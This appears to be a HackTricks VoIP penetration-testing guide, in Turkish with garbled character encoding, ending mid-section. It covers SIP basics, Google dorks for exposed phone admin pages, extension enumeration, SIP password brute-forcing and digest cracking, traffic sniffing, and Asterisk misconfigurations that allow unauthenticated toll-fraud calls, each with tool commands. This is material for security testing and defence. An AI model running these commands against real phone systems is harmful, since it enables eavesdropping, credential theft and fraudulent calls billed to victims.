# VoIP Pentesting

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi keÅŸfedin (https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## VoIP Temel Bilgiler

VoIP'nin nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± Ã¶ÄŸrenmeye baÅŸlamak iÃ§in ÅŸu adrese bakÄ±n:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Temel Mesajlar
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## YanÄ±t KodlarÄ±

**1xxâ€”GeÃ§ici YanÄ±tlar**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxâ€”BaÅŸarÄ±lÄ± YanÄ±tlar**
```
200 OK
202 Accepted
204 No Notification
```
**3xxâ€”YÃ¶nlendirme YanÄ±tlarÄ±**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxâ€”Ä°stemci HatasÄ± YanÄ±tlarÄ±**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxâ€”Sunucu HatasÄ± YanÄ±tlarÄ±**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxâ€”KÃ¼resel BaÅŸarÄ±sÄ±zlÄ±k YanÄ±tlarÄ±**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Numaralama

### Telefon NumaralarÄ±

KÄ±rmÄ±zÄ± TakÄ±m'Ä±n yapabileceÄŸi ilk adÄ±mlardan biri, OSINT araÃ§larÄ±, Google AramalarÄ± veya web sayfalarÄ±nÄ± kazÄ±yarak ÅŸirketle iletiÅŸim kurmak iÃ§in kullanÄ±labilecek telefon numaralarÄ±nÄ± aramaktÄ±r.

Telefon numaralarÄ±na sahip olduktan sonra operatÃ¶rÃ¼ tanÄ±mlamak iÃ§in Ã§evrimiÃ§i hizmetler kullanabilirsiniz:

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

OperatÃ¶rÃ¼n VoIP hizmetleri saÄŸlayÄ±p saÄŸlamadÄ±ÄŸÄ±nÄ± bilmek, ÅŸirketin VoIP kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± belirlemenizi saÄŸlar... AyrÄ±ca, ÅŸirketin VoIP hizmetleri kiralamamÄ±ÅŸ olabileceÄŸi ancak kendi VoIP PBX'ini geleneksel telefon aÄŸÄ±na baÄŸlamak iÃ§in PSTN kartlarÄ± kullandÄ±ÄŸÄ± da mÃ¼mkÃ¼ndÃ¼r.

MÃ¼zik gibi otomatik yanÄ±tlar gibi ÅŸeyler genellikle VoIP kullanÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶sterir. 

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT bilgisi

VoIP yazÄ±lÄ±mÄ±nÄ±n belirlenmesine yardÄ±mcÄ± olan herhangi bir diÄŸer OSINT numaralandÄ±rmasÄ±, KÄ±rmÄ±zÄ± TakÄ±m iÃ§in faydalÄ± olacaktÄ±r.

### AÄŸ NumaralandÄ±rma

* **`nmap`**, UDP hizmetlerini tarama yeteneÄŸine sahiptir, ancak taranan UDP hizmetlerinin sayÄ±sÄ± nedeniyle bu tÃ¼r hizmetlerle Ã§ok yavaÅŸ ve Ã§ok doÄŸru olmayabilir.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** SIPVicious'tan (`sudo apt install sipvicious`): Belirtilen aÄŸdaki SIP hizmetlerini bulacaktÄ±r.
* `svmap`, `friendly-scanner` KullanÄ±cÄ± AjanÄ±nÄ± kullandÄ±ÄŸÄ± iÃ§in **kolayca engellenebilir**, ancak `/usr/share/sipvicious/sipvicious` dizininden kodu deÄŸiÅŸtirerek bunu deÄŸiÅŸtirebilirsiniz.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS taramasÄ±`** [**sippts**](https://github.com/Pepelux/sippts)**'dan:** SIPPTS taramasÄ±, UDP, TCP veya TLS Ã¼zerinden SIP hizmetleri iÃ§in Ã§ok hÄ±zlÄ± bir tarayÄ±cÄ±dÄ±r. Ã‡oklu iÅŸ parÃ§acÄ±ÄŸÄ± kullanÄ±r ve geniÅŸ aÄŸ aralÄ±klarÄ±nÄ± tarayabilir. Kolayca bir baÄŸlantÄ± noktasÄ± aralÄ±ÄŸÄ± belirtmeyi, hem TCP hem de UDP'yi taramayÄ±, baÅŸka bir yÃ¶ntem kullanmayÄ± saÄŸlar (varsayÄ±lan olarak OPTIONS kullanacaktÄ±r) ve farklÄ± bir KullanÄ±cÄ± AjanÄ± belirtmeyi mÃ¼mkÃ¼n kÄ±lar (ve daha fazlasÄ±).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Ekstra AÄŸ NumaralandÄ±rma

PBX ayrÄ±ca ÅŸu gibi diÄŸer aÄŸ hizmetlerini de aÃ§Ä±klayabilir:

- **69/UDP (TFTP)**: Firmware gÃ¼ncellemeleri
- **80 (HTTP) / 443 (HTTPS)**: CihazÄ± web Ã¼zerinden yÃ¶netmek iÃ§in
- **389 (LDAP)**: KullanÄ±cÄ± bilgilerini depolamak iÃ§in alternatif
- **3306 (MySQL)**: MySQL veritabanÄ±
- **5038 (YÃ¶netici)**: DiÄŸer platformlardan Asterisk'i kullanmaya izin verir
- **5222 (XMPP)**: Jabber kullanarak mesajlar
- **5432 (PostgreSQL)**: PostgreSQL veritabanÄ±
- Ve diÄŸerleri...

### YÃ¶ntemler NumaralandÄ±rma

PBX'te kullanÄ±labilir olan **hangi yÃ¶ntemlerin** bulunabileceÄŸini [**sippts**](https://github.com/Pepelux/sippts) Ã¼zerinden `SIPPTS enumerate` kullanarak bulmak mÃ¼mkÃ¼ndÃ¼r.
```bash
sippts enumerate -i 10.10.0.10
```
### Sunucu yanÄ±tlarÄ±nÄ±n analizi

Bize geri gÃ¶nderilen sunucu baÅŸlÄ±klarÄ±nÄ± analiz etmek, gÃ¶nderdiÄŸimiz mesaj tÃ¼rÃ¼ne ve baÅŸlÄ±klara baÄŸlÄ± olarak Ã§ok Ã¶nemlidir. [**sippts**](https://github.com/Pepelux/sippts) 'den `SIPPTS send` ile kiÅŸiselleÅŸtirilmiÅŸ mesajlar gÃ¶nderebilir, tÃ¼m baÅŸlÄ±klarÄ± manipÃ¼le edebilir ve yanÄ±tÄ± analiz edebiliriz.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
AyrÄ±ca sunucu websockets kullanÄ±yorsa veri elde etmek mÃ¼mkÃ¼ndÃ¼r. [**sippts**](https://github.com/Pepelux/sippts) Ã¼zerinden `SIPPTS wssend` kullanarak kiÅŸiselleÅŸtirilmiÅŸ WS mesajlarÄ± gÃ¶nderebiliriz.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### UzantÄ± NumaralarÄ±nÄ±n SÄ±ralanmasÄ±

PBX (Ã–zel Åube DeÄŸiÅŸim) sistemlerinde uzantÄ±lar, bir organizasyonun veya iÅŸletmenin iÃ§indeki bireysel telefon hatlarÄ±, cihazlar veya kullanÄ±cÄ±lara atanan **benzersiz iÃ§ tanÄ±mlayÄ±cÄ±lara** atÄ±fta bulunur. UzantÄ±lar, her kullanÄ±cÄ± veya cihaz iÃ§in ayrÄ± harici telefon numaralarÄ±na gerek kalmadan, **aramalarÄ±n organizasyon iÃ§inde verimli bir ÅŸekilde yÃ¶nlendirilmesini** saÄŸlar.

* **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar`, Ã¼cretsiz bir SIP PBX uzantÄ± hattÄ± tarayÄ±cÄ±sÄ±dÄ±r. Kavram olarak, geleneksel wardialer'lar gibi Ã§alÄ±ÅŸarak **bir dizi uzantÄ±yÄ± tahmin ederek veya belirli bir uzantÄ± listesini kullanarak** Ã§alÄ±ÅŸÄ±r.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten, bir SIP sunucusundaki uzantÄ±larÄ± tanÄ±mlar. Sipexten geniÅŸ aÄŸ ve port aralÄ±klarÄ±nÄ± kontrol edebilir.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Metasploit ile uzantÄ±larÄ±/kullanÄ±cÄ± adlarÄ±nÄ± da sÄ±ralayabilirsiniz:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX**, Inter Asterisk Exchange protokolÃ¼ **kullanÄ±cÄ± adÄ± brute-force numaralandÄ±rÄ±cÄ±sÄ±**dÄ±r. enumIAX iki farklÄ± modda Ã§alÄ±ÅŸabilir; SÄ±ralÄ± KullanÄ±cÄ± AdÄ± Tahmini veya SÃ¶zlÃ¼k SaldÄ±rÄ±sÄ±.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP SaldÄ±rÄ±larÄ±

### Åifre Kaba Kuvvet - Ã§evrimiÃ§i

Bir KÄ±rmÄ±zÄ± TakÄ±m, **PBX**'i ve bazÄ± **dahili kullanÄ±cÄ± adlarÄ±nÄ±** keÅŸfettikten sonra, bir sÃ¶zlÃ¼k kullanarak kimlik doÄŸrulamasÄ±nÄ± kaba kuvvet saldÄ±rÄ±sÄ±yla deneyebilir ve bir uzantÄ±ya `REGISTER` yÃ¶ntemi aracÄ±lÄ±ÄŸÄ±yla kimlik doÄŸrulamaya Ã§alÄ±ÅŸabilir.

{% hint style="danger" %}
**KullanÄ±cÄ± adÄ±nÄ±n**, uzantÄ± ile aynÄ± olabileceÄŸini unutmayÄ±n, ancak bu uygulama PBX sistemi, yapÄ±landÄ±rmasÄ± ve organizasyonun tercihlerine baÄŸlÄ± olarak deÄŸiÅŸebilir...

EÄŸer kullanÄ±cÄ± adÄ± uzantÄ± ile aynÄ± deÄŸilse, **kullanÄ±cÄ± adÄ±nÄ± bulup kaba kuvvet uygulamak iÃ§in** belirlemeniz gerekecektir.
{% endhint %}

* **`svcrack`** from SIPVicious (`sudo apt install sipvicious`): SVCrack, bir PBX Ã¼zerinde belirli bir kullanÄ±cÄ± adÄ±/uzantÄ± iÃ§in ÅŸifreyi kÄ±rmak iÃ§in kullanÄ±lÄ±r.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** [**sippts**](https://github.com/Pepelux/sippts)**'dan:** SIPPTS rcrack, SIP hizmetleri iÃ§in uzaktan ÅŸifre kÄ±rÄ±cÄ±dÄ±r. Rcrack, farklÄ± IP'lerde ve port aralÄ±klarÄ±nda birkaÃ§ kullanÄ±cÄ±nÄ±n ÅŸifrelerini test edebilir.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### VoIP Sniffing

EÄŸer **AÃ§Ä±k Wifi aÄŸÄ±** iÃ§inde VoIP ekipmanÄ± bulursanÄ±z, **tÃ¼m bilgileri** **sÄ±zdÄ±rabilirsiniz**. DahasÄ±, daha kapalÄ± bir aÄŸda bulunuyorsanÄ±z (Ethernet Ã¼zerinden baÄŸlÄ± veya korumalÄ± Wifi ile baÄŸlÄ±), **ARPspoofing** gibi **MitM saldÄ±rÄ±larÄ±** gerÃ§ekleÅŸtirebilir ve bilgileri **PBX ve aÄŸ geÃ§idi** arasÄ±nda sÄ±zdÄ±rmak iÃ§in.

AÄŸ bilgileri arasÄ±nda, ekipmanÄ± yÃ¶netmek iÃ§in **web kimlik bilgileri**, kullanÄ±cÄ± **dahili numaralarÄ±**, **kullanÄ±cÄ± adÄ±**, **IP** adresleri, hatta **karmalanmÄ±ÅŸ ÅŸifreler** ve **konuÅŸmayÄ± dinlemek iÃ§in Ã§oÄŸaltabileceÄŸiniz RTP paketleri** bulabilirsiniz.

Bu bilgilere ulaÅŸmak iÃ§in Wireshark, tcpdump gibi araÃ§larÄ± kullanabilirsiniz, ancak VoIP konuÅŸmalarÄ±nÄ± sÄ±zdÄ±rmak iÃ§in **Ã¶zel olarak oluÅŸturulmuÅŸ bir araÃ§ olan** [**ucsniff**](https://github.com/Seabreg/ucsniff) kullanabilirsiniz.

{% hint style="danger" %}
**SIP iletiÅŸiminde TLS kullanÄ±lÄ±yorsa**, SIP iletiÅŸimini aÃ§Ä±k bir ÅŸekilde gÃ¶remezsiniz.\
AynÄ± durum **SRTP** ve **ZRTP** kullanÄ±lÄ±yorsa da geÃ§erlidir, **RTP paketleri aÃ§Ä±k metin olmayacaktÄ±r**.
{% endhint %}

#### SIP kimlik bilgileri (Åifre Kaba Kuvvet - Ã§evrimdÄ±ÅŸÄ±)

Daha iyi anlamak iÃ§in bu Ã¶rneÄŸe bakÄ±n: **SIP KAYIT iletiÅŸimini** daha iyi anlamak iÃ§in [**SIP REGISTER Ã¶rneÄŸine**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) bakÄ±n ve **kimlik bilgilerinin nasÄ±l gÃ¶nderildiÄŸini** Ã¶ÄŸrenin.

* **`sipdump`** & **`sipcrack`,** **sipcrack**'in bir parÃ§asÄ± (`apt-get install sipcrack`): Bu araÃ§lar, SIP protokolÃ¼ iÃ§indeki **digest kimlik doÄŸrulamalarÄ±nÄ±** bir **pcap** dosyasÄ±ndan **Ã§Ä±karabilir** ve **kaba kuvvet** uygulayabilir.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump, bir pcap dosyasÄ±ndan digest kimlik doÄŸrulamalarÄ±nÄ± Ã§Ä±karabilir.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** [**sippts**](https://github.com/Pepelux/sippts)**'dan:** SIPPTS dcrack, SIPPTS dump ile elde edilen digest kimlik doÄŸrulamalarÄ±nÄ± kÄ±rmak iÃ§in bir araÃ§tÄ±r.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark, bir PCAP dosyasÄ±ndan SIP protokolÃ¼ verilerini Ã§Ä±karÄ±r.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF kodlarÄ±

AÄŸ trafiÄŸinde **yalnÄ±zca SIP kimlik bilgileri** deÄŸil, aynÄ± zamanda Ã¶rneÄŸin **sesli postaya eriÅŸmek** iÃ§in kullanÄ±lan DTMF kodlarÄ± da bulunabilir.\
Bu kodlarÄ± **INFO SIP mesajlarÄ±** iÃ§inde, **ses** iÃ§inde veya **RTP paketleri** iÃ§inde gÃ¶ndermek mÃ¼mkÃ¼ndÃ¼r. Kodlar RTP paketlerinin iÃ§indeyse, konuÅŸmanÄ±n o kÄ±smÄ±nÄ± kesip onlarÄ± Ã§Ä±karmak iÃ§in multimo aracÄ±nÄ± kullanabilirsiniz:
```bash
multimon -a DTMF -t wac pin.wav
```
### Ãœcretsiz Aramalar / Asterisk BaÄŸlantÄ±larÄ± YanlÄ±ÅŸ YapÄ±landÄ±rmalarÄ±

Asterisk'te bir baÄŸlantÄ±ya **belirli bir IP adresinden** veya **herhangi bir IP adresinden** izin vermek mÃ¼mkÃ¼ndÃ¼r:
```
host=10.10.10.10
host=dynamic
```
EÄŸer bir IP adresi belirtilirse, ana makine **zaman zaman REGISTER** istekleri gÃ¶ndermek zorunda kalmayacak (REGISTER paketinde genellikle 30 dakika olan yaÅŸam sÃ¼resi gÃ¶nderilir, bu da baÅŸka bir senaryoda telefonun her 30 dakikada bir REGISTER yapmasÄ± gerektiÄŸi anlamÄ±na gelir). Bununla birlikte, VoIP sunucusundan gelen aramalarÄ± almak iÃ§in aÃ§Ä±k baÄŸlantÄ±lara izin veren portlara sahip olmasÄ± gerekecek.

KullanÄ±cÄ±larÄ± tanÄ±mlamak iÃ§in ÅŸu ÅŸekilde tanÄ±mlanabilirler:

* **`type=user`**: KullanÄ±cÄ± sadece kullanÄ±cÄ± olarak arama alabilir.
* **`type=friend`**: Peer olarak aramalar yapÄ±labilir ve kullanÄ±cÄ± olarak alÄ±nabilir (uzantÄ±larla kullanÄ±lÄ±r)
* **`type=peer`**: Peer olarak arama yapÄ±labilir ve alÄ±nabilir (SIP-trunk'larla kullanÄ±lÄ±r)

AyrÄ±ca gÃ¼vensiz deÄŸiÅŸkenle gÃ¼ven oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:

* **`insecure=port`**: IP tarafÄ±ndan doÄŸrulanmÄ±ÅŸ peer baÄŸlantÄ±larÄ±na izin verir.
* **`insecure=invite`**: INVITE mesajlarÄ± iÃ§in kimlik doÄŸrulama gerektirmez
* **`insecure=port,invite`**: Her ikisi de

{% hint style="warning" %}
**`type=friend`** kullanÄ±ldÄ±ÄŸÄ±nda, **host** deÄŸiÅŸkeninin **deÄŸeri kullanÄ±lmayacak**, bu yÃ¼zden bir yÃ¶netici **bu deÄŸeri kullanarak bir SIP-trunk'Ä± yanlÄ±ÅŸ yapÄ±landÄ±rÄ±rsa**, **herkes ona baÄŸlanabilecek**.

Ã–rneÄŸin, bu yapÄ±landÄ±rma savunmasÄ±z olacaktÄ±r:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Ãœcretsiz Aramalar / Asterisk BaÄŸlam YanlÄ±ÅŸ YapÄ±landÄ±rmalarÄ±

Asterisk'te bir **baÄŸlam (context)**, **ilgili uzantÄ±larÄ±, eylemleri ve kurallarÄ± gruplayan** ve adlandÄ±rÄ±lmÄ±ÅŸ bir konteyner veya bÃ¶lÃ¼mdÃ¼r. Ã‡aÄŸrÄ± planÄ±, bir Asterisk sisteminin temel bileÅŸenidir, Ã§Ã¼nkÃ¼ **gelen ve giden aramalarÄ±n nasÄ±l ele alÄ±ndÄ±ÄŸÄ±nÄ± ve yÃ¶nlendirildiÄŸini tanÄ±mlar**. BaÄŸlamlar, Ã§aÄŸrÄ± planÄ±nÄ± dÃ¼zenlemek, eriÅŸim kontrolÃ¼nÃ¼ yÃ¶netmek ve sistemin farklÄ± bÃ¶lÃ¼mleri arasÄ±nda ayrÄ±m saÄŸlamak iÃ§in kullanÄ±lÄ±r.

Her baÄŸlam genellikle **`extensions.conf`** dosyasÄ±nda tanÄ±mlanÄ±r. BaÄŸlamlar, kÃ¶ÅŸeli parantezlerle belirtilir ve baÄŸlam adÄ± bunlarÄ±n iÃ§ine alÄ±nÄ±r. Ã–rneÄŸin:
```bash
csharpCopy code[my_context]
```
Ä°Ã§erikte, uzantÄ±larÄ± (Ã§evrilen numaralarÄ±n desenleri) tanÄ±mlarsÄ±nÄ±z ve bunlarÄ± bir dizi eylem veya uygulama ile iliÅŸkilendirirsiniz. Bu eylemler Ã§aÄŸrÄ±nÄ±n nasÄ±l iÅŸlendiÄŸini belirler. Ã–rneÄŸin:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Bu Ã¶rnek, "my\_context" adÄ±nda basit bir baÄŸlamÄ± ve "100" uzantÄ±sÄ±nÄ± gÃ¶stermektedir. Birisi 100 numarayÄ± Ã§evirdiÄŸinde, arama cevaplanacak, bir karÅŸÄ±lama mesajÄ± Ã§alÄ±nacak ve ardÄ±ndan arama sonlandÄ±rÄ±lacaktÄ±r.

Bu ise **baÅŸka bir baÄŸlamdÄ±r** ve **herhangi bir baÅŸka numarayÄ± aramaya izin verir**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
EÄŸer yÃ¶netici **varsayÄ±lan baÄŸlamÄ±** ÅŸu ÅŸekilde tanÄ±mlarsa:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Herhangi biri, **sunucuyu kullanarak herhangi bir numarayÄ± arayabilecek** (ve sunucu yÃ¶neticisi aramanÄ±n bedelini Ã¶deyecek).
{% endhint %}

{% hint style="danger" %}
AyrÄ±ca, varsayÄ±lan olarak **`sip.conf`** dosyasÄ± **`allowguest=true`** iÃ§erir, bu durumda **herhangi bir** kimlik doÄŸrulamasÄ± olmadan **herhangi bir numarayÄ± aramak mÃ¼mkÃ¼n olacaktÄ±r**.
{% endhint %}

*   **`SIPPTS invite`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS daveti, bir **PBX sunucusunun kimlik doÄŸrulamasÄ±z aramalara izin verip vermediÄŸini kontrol eder**. EÄŸer SIP sunucusu yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, harici numaralara arama yapmamÄ±za izin verecektir. AyrÄ±ca, aramayÄ± ikinci bir harici numaraya aktarmamÄ±za da izin verebilir.

Ã–rneÄŸin, Asterisk sunucunuzun kÃ¶tÃ¼ bir baÄŸlam yapÄ±landÄ±rmasÄ± varsa, kimlik doÄŸrulamasÄ±z INVITE isteÄŸini kabul edebilirsiniz. Bu durumda, bir saldÄ±rgan herhangi bir kullanÄ±cÄ±/ÅŸifreyi bilmeden arama yapabilir.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Ãœcretsiz aramalar / YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ IVRS

IVRS, **Interactive Voice Response System**'in kÄ±saltmasÄ±dÄ±r, kullanÄ±cÄ±larÄ±n ses veya tuÅŸ tonu giriÅŸleri aracÄ±lÄ±ÄŸÄ±yla bilgisayarlaÅŸtÄ±rÄ±lmÄ±ÅŸ bir sistemle etkileÅŸime girmelerini saÄŸlayan bir telekomÃ¼nikasyon teknolojisidir. IVRS, bilgi saÄŸlama, Ã§aÄŸrÄ±larÄ± yÃ¶nlendirme ve kullanÄ±cÄ± giriÅŸlerini yakalama gibi Ã§eÅŸitli iÅŸlevler sunan **otomatik Ã§aÄŸrÄ± iÅŸleme** sistemleri oluÅŸturmak iÃ§in kullanÄ±lÄ±r.

VoIP sistemlerinde IVRS genellikle ÅŸunlardan oluÅŸur:

1. **Sesli ipuÃ§larÄ±**: KullanÄ±cÄ±larÄ± IVR menÃ¼ seÃ§enekleri ve talimatlarÄ±yla yÃ¶nlendiren Ã¶nceden kaydedilmiÅŸ sesli mesajlar.
2. **DTMF** (Dual-Tone Multi-Frequency) sinyallemesi: Telefon tuÅŸlarÄ±na basarak oluÅŸturulan tuÅŸ tonu giriÅŸleri, IVR menÃ¼lerinde gezinmek ve giriÅŸ saÄŸlamak iÃ§in kullanÄ±lÄ±r.
3. **Ã‡aÄŸrÄ± yÃ¶nlendirme**: KullanÄ±cÄ± giriÅŸine baÄŸlÄ± olarak Ã§aÄŸrÄ±larÄ± belirli departmanlara, ajanlara veya uzantÄ±lara yÃ¶nlendirme.
4. **KullanÄ±cÄ± giriÅŸi yakalama**: Arayanlardan hesap numaralarÄ±, vaka kimlikleri veya diÄŸer ilgili veriler gibi bilgileri toplama.
5. **Harici sistemlerle entegrasyon**: IVR sisteminin veritabanlarÄ±na veya diÄŸer yazÄ±lÄ±m sistemlerine baÄŸlanarak bilgilere eriÅŸme veya gÃ¼ncelleme, iÅŸlemler gerÃ§ekleÅŸtirme veya olaylarÄ± tetikleme.

Asterisk VoIP sisteminde, IVR oluÅŸturmak iÃ§in **`extensions.conf`** dosyasÄ± gibi Ã§eÅŸitli uygulamalar ve `Background()`, `Playback()`, `Read()` ve daha fazlasÄ± gibi uygulamalar kullanabilirsiniz. Bu uygulamalar, sesli ipuÃ§larÄ± Ã§almanÄ±za, kullanÄ±cÄ± giriÅŸini yakalamanÄ±za ve Ã§aÄŸrÄ± akÄ±ÅŸÄ±nÄ± kontrol etmenize yardÄ±mcÄ± olur.

#### Hassas yapÄ±landÄ±rma Ã¶rneÄŸi
```scss
